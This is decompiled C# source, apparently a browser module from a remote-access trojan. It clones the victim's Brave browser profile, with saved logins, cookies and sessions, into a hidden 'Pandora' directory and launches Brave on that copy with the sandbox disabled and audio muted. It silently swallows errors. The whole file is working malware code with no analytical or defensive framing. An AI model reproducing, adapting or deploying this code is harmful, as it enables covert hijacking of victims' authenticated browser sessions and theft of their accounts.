// Decompiled with JetBrains decompiler
// Type: DLL.Browser.Brave
// Assembly: DLL, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EC79D3BA-C0CA-492A-8F84-32B4334A7F73
// Assembly location: C:\Users\rashid\Desktop\file.exe


using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Client.Helper.Browser
{
  public class Brave
  {
    private const short SWP_NOMOVE = 2;
    private const short SWP_NOSIZE = 1;
    private const short SWP_NOZORDER = 4;
    private const int SWP_SHOWWINDOW = 64;

    [DllImport("user32.dll")]
    public static extern IntPtr SetWindowPos(
      IntPtr hWnd,
      int hWndInsertAfter,
      int x,
      int Y,
      int cx,
      int cy,
      int wFlags);

    public static bool StartBrave(bool duplicate)
    {
            bool done = false;

            try
            {
        if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Pandora\\lockfile"))))
        {
        }
        else
        {
          if (duplicate)
          {
            try
            {
                            if (!Directory.Exists(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Pandora\\"))

                            {
                                Outils.a.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data", Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Pandora\\", true);

                            }
                        }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else

                        done=Process.Start("brave", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\Pandora\" --no-sandbox --allow-no-sandbox-job --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
          
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
            return done;

    }
  }
}
